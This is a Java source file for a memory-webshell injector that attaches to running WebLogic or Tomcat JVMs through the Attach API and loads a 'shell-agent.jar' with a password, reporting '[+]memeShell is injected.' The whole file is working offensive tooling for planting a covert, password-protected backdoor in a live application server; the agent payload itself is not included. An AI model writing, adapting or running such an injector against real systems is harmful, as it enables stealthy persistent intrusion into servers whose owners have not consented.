package main.java;

import com.sun.tools.attach.AgentLoadException;
import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;

import java.io.File;
import java.util.List;

public class Attach {

    public static void main(String[] args) throws Exception {
        if (args.length == 0) {
            System.out.println("Usage: java -jar inject-1.0.jar <password>");
            return;
        }
        VirtualMachine vm = null;
        List<VirtualMachineDescriptor> vmList = null;
        String password = args[0];
        String currentPath = Attach.class.getProtectionDomain().getCodeSource().getLocation().getPath();
        currentPath = currentPath.substring(0, currentPath.lastIndexOf("/") + 1);
//        String agentFile = currentPath + "shell-agent.jar";
        String agentFile ="D:\\IntelliJ IDEA 2021.1.2\\project\\weblogic_memshell\\memshell_asm\\target\\shell-agent.jar";

        agentFile = new File(agentFile).getCanonicalPath();
        String agentArgs = currentPath;
        agentArgs = agentArgs + "^" + password;

        while (true) {
            try {
                vmList = VirtualMachine.list();
                if (vmList.size() <= 0)
                    continue;
                for (VirtualMachineDescriptor vmd : vmList) {
                    if (vmd.displayName().contains("weblogic.Server") || vmd.displayName().contains("catalina")) {
                        vm = VirtualMachine.attach(vmd);
                        System.out.println("[+]OK.i find a jvm.");
                        Thread.sleep(1000);
                        System.out.println("agent.jar 加载路径：" + agentFile);
                        if (null != vm) {
                            vm.loadAgent(agentFile, agentArgs);
                            System.out.println("[+]memeShell is injected.");
                            vm.detach();
                            return;
                        }
                    }
                }
                Thread.sleep(3000);
            } catch (AgentLoadException e1) {
                System.out.println("shell-agent.jar 错误。Agent JAR not found or no Agent-Class attribute");
                System.exit(-1);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}